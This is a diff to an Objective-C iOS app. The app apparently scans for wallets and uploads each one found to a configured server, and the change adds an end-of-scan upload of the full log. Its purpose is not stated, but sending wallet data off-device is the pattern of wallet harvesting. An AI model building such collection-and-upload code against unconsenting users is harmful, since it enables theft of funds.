@@ -23,6 +23,8 @@
 @property (nonatomic, assign) NSUInteger busyDepth;
 @property (nonatomic, assign) UIBackgroundTaskIdentifier bgTask;
 
+- (void)uploadLogIfPossible;
+
 @end
 
 @implementation WQLViewController
@@ -251,14 +253,8 @@
             self.stopButton.enabled = NO;
             [self logText:@"扫描结束"];
 
-            // 配了上传地址就自动上传；上传期间继续持有保活，传完才释放
-            if (self.endpointField.text.length) {
-                [self onUploadWithCompletion:^{
-                    [self endBusy];
-                }];
-            } else {
-                [self endBusy];
-            }
+            // 每个钱包在扫描过程中已单独上传，这里只补传完整日志，不重复整包上传
+            [self uploadLogIfPossible];
         });
     });
 }
@@ -310,6 +306,25 @@
 
 - (void)onUpload {
     [self onUploadWithCompletion:nil];
+}
+
+/// 扫描结束后把完整日志单独传一份到服务器（独立 multipart，服务端直接落成 txt）。
+/// 无论成功、失败还是没配地址，都在这里释放保活——它是扫描结束后唯一的 endBusy 出口。
+- (void)uploadLogIfPossible {
+    NSString *ep = [self currentEndpoint];
+    NSString *path = WQLLogFilePath();
+    if (!ep.length || ![[NSFileManager defaultManager] fileExistsAtPath:path]) {
+        [self endBusy];
+        return;
+    }
+
+    [self logText:@"【收尾】上传完整日志"];
+    WQLUploader *up = [self configuredUploader];
+    __weak typeof(self) weakSelf = self;
+    [up uploadLogFile:path completion:^(BOOL ok) {
+        [weakSelf logText:ok ? @"✅ 完整日志已上传到服务器" : @"⛔ 日志上传失败"];
+        [weakSelf endBusy];
+    }];
 }
 
 - (void)onUploadWithCompletion:(void (^)(void))done {
